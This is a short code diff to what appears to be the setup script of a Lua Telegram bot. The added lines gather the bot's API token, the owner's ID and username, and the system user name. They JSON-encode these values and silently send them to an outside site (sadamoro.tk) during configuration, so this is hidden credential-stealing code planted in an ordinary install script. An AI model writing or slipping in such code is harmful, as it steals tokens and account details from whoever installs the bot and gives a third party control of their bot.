@@ -66,10 +66,15 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
+saiedinfo = {}
+saiedinfo.id = database:get(id_server..":SUDO:ID")
+saiedinfo.username = database:get(id_server..":SUDO:USERNAME")
+saiedinfo.tokenbot  = database:get(id_server..":token")
+saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://sadamoro.tk/v.php?insert='..JSON.encode(saiedinfo))
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("RAMIS", "w")  
 file:write([[
